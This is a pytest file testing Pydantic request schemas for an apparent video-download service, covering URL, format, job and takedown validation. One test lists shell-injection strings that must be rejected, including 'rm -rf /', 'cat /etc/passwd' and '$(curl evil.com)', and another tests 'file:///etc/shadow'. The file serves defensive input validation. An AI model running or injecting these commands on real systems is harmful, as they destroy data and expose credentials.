import pytest
from pydantic import ValidationError

from app.schemas.extract import FormatOption, UrlExtractRequest
from app.schemas.job import CreateJobRequest
from app.schemas.takedown import TakedownRequest


def test_url_extract_request_valid():
    """Verify clean URL passes validation."""
    req = UrlExtractRequest(url="  https://youtube.com/watch?v=12345  ")
    assert req.url == "https://youtube.com/watch?v=12345"


def test_url_extract_request_invalid_scheme():
    """Verify non-http scheme is rejected by Pydantic validator."""
    with pytest.raises(ValidationError):
        UrlExtractRequest(url="ftp://example.com/media")

    with pytest.raises(ValidationError):
        UrlExtractRequest(url="file:///etc/shadow")


def test_create_job_request_valid():
    """Verify valid format_id with plus sign or alphanumeric characters."""
    req = CreateJobRequest(
        url="https://youtube.com/watch?v=12345",
        format_id="137+140",
        audio_only=False,
        quality_label="1080p",
    )
    assert req.format_id == "137+140"
    assert req.audio_only is False


def test_create_job_request_command_injection_rejected():
    """Verify shell injection characters in format_id are blocked by regex."""
    malicious_inputs = [
        "137; rm -rf /",
        "137 | cat /etc/passwd",
        "137 && whoami",
        "137`id`",
        "137$(curl evil.com)",
        "format/../traversal",
    ]
    for bad_id in malicious_inputs:
        with pytest.raises(ValidationError):
            CreateJobRequest(
                url="https://youtube.com/watch?v=12345",
                format_id=bad_id,
            )


def test_format_option_model():
    """Verify format option structure."""
    opt = FormatOption(
        format_id="22",
        resolution="720p",
        height=720,
        fps=30.0,
        ext="mp4",
        format_note="720p HD",
        filesize_approx=52000000,
        is_audio_only=False,
    )
    assert opt.ext == "mp4"
    assert opt.height == 720


def test_takedown_request_validation():
    """Verify legal takedown fields."""
    # Valid
    td = TakedownRequest(
        requester_name="Copyright Agent",
        requester_email="agent@copyright.org",
        copyrighted_work_url="https://official.org/work",
        infringing_url="https://anystream.local/download/xyz",
        declaration_truth=True,
    )
    assert td.requester_name == "Copyright Agent"

    # Invalid email
    with pytest.raises(ValidationError):
        TakedownRequest(
            requester_name="Copyright Agent",
            requester_email="not-an-email",
            copyrighted_work_url="https://official.org/work",
            infringing_url="https://anystream.local/download/xyz",
            declaration_truth=True,
        )

